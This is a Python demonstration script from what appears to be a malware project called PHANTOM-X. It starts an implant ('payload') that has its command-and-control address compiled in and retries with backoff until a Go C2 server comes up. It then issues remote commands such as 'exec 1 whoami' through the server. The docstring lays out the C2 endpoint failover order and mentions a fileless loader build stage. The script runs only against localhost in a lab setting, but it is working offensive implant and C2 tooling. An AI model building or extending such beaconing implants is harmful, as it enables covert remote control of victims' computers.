#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHANTOM-X :: the auto-connect demonstration
===============================================================================
demo_auto_connect.py -- Proves that the payload finds the C2 on its own.

WHAT IT DEMONSTRATES
    The payload is started FIRST, with the C2 address COMPILED IN at build
    time and no environment variables at all. The server is started
    twelve seconds later.

    The payload does not care that the server was not there yet. It
    retries with a backoff -- five seconds, ten, twenty, forty, sixty --
    and connects the moment the server is listening.

    That is what "does it work automatically" means, and it is easier to
    show than to describe.

THE ADDRESS IS COMPILED IN, NOT IN AN ENVIRONMENT VARIABLE
    The payload resolves its C2 in this order:

        1. PX_C2_ENDPOINTS   a comma-separated failover list
        2. PX_C2_HOST        a single host
        3. PX_C2_PORT        a single port
        4. the compiled-in default, from -C2Host / -C2Port

    The environment variables exist so that the SAME binary can be
    pointed somewhere else without rebuilding it. For a lab that runs
    against a fixed address, bake it in and forget about them.

USAGE
    python3 demo_auto_connect.py
    python3 demo_auto_connect.py --payload ..\\dist\\variants\\px_payload_all.exe
    python3 demo_auto_connect.py --port 9001
"""

from __future__ import annotations

import argparse
import os
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description="Show that the payload connects to the C2 on its own")
    ap.add_argument("--payload", default=None,
                    help="path to the payload (default: the 'all' arm)")
    ap.add_argument("--server", default=None,
                    help="path to the Go C2 server")
    ap.add_argument("--port", type=int, default=9001,
                    help="the port the payload was built to connect to")
    ap.add_argument("--delay", type=int, default=12,
                    help="seconds to wait before starting the server")
    args = ap.parse_args(argv)

    payload = args.payload or os.path.join(ROOT, "dist", "variants",
                                           "px_payload_all.exe")
    payload = os.path.abspath(payload)
    server = args.server or os.path.join(HERE, "px_c2.exe")
    server = os.path.abspath(server)

    if not os.path.isfile(payload):
        print(f"error: payload not built: {payload}", file=sys.stderr)
        print("  build it:  cd phase3_fileless\\loader && "
              ".\\build_variants.ps1", file=sys.stderr)
        return 2
    if not os.path.isfile(server):
        print(f"error: the C2 server is not built: {server}", file=sys.stderr)
        print("  build it:  cd phase5_network && go build -o px_c2.exe .",
              file=sys.stderr)
        return 2

    audit = os.path.join(os.environ.get("TEMP", "."), "px_auto_audit.jsonl")
    if os.path.exists(audit):
        os.remove(audit)

    # Start the PAYLOAD FIRST. No server. No environment variables.
    penv = dict(os.environ)
    for v in ("PX_C2_HOST", "PX_C2_PORT", "PX_C2_ENDPOINTS"):
        penv.pop(v, None)

    pay = subprocess.Popen([payload], env=penv, stdout=subprocess.PIPE,
                           stderr=subprocess.STDOUT, text=True)
    print("=" * 70)
    print("PHANTOM-X :: AUTO-CONNECT DEMONSTRATION")
    print("=" * 70)
    print("  payload started with NO PX_C2_HOST and NO PX_C2_PORT")
    print(f"  the address is COMPILED IN")
    print(f"...waiting {args.delay} seconds before the server is started...")

    server_proc = None
    out = ""
    pout = ""
    try:
        time.sleep(args.delay)
        server_proc = subprocess.Popen(
            [server, "--host", "127.0.0.1", "--port", str(args.port),
             "--log", audit],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT, text=True, bufsize=1)
        print("...server started; waiting for the payload to find it...")

        # The payload retries with a backoff, so this can take up to a
        # minute. The audit log is the check, not the console.
        session = False
        deadline = time.time() + 90
        while time.time() < deadline:
            server_proc.stdin.write("list\n")
            server_proc.stdin.flush()
            time.sleep(2)
            if os.path.isfile(audit):
                with open(audit, "r", encoding="utf-8",
                          errors="replace") as fh:
                    if '"session_open"' in fh.read():
                        session = True
                        break
        print(f"...session {'established' if session else 'NOT established'}")

        server_proc.stdin.write("exec 1 whoami\n")
        server_proc.stdin.flush()
        time.sleep(2)
        server_proc.stdin.write("exec 1 echo IT_CONNECTED_ON_ITS_OWN\n")
        server_proc.stdin.flush()
        time.sleep(3)
        server_proc.stdin.write("quit\n")
        server_proc.stdin.flush()
        time.sleep(1)
    finally:
        if server_proc:
            try:
                out, _ = server_proc.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                server_proc.kill()
                out, _ = server_proc.communicate()
        pay.terminate()
        try:
            pout, _ = pay.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            pay.kill()
            pout, _ = pay.communicate()

    print()
    print("-" * 70)
    print("THE PAYLOAD'S OWN LOG")
    print("-" * 70)
    for ln in (pout or "").splitlines():
        if ln.strip():
            print(f"  {ln}")
    print()
    print("-" * 70)
    print("THE SERVER CONSOLE")
    print("-" * 70)
    for ln in (out or "").splitlines():
        if ln.strip():
            print(f"  {ln}")
    print()
    print("  The payload never had the address in an environment variable,")
    print("  and it connected to a server that did not exist when it")
    print("  started. That is the whole answer.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
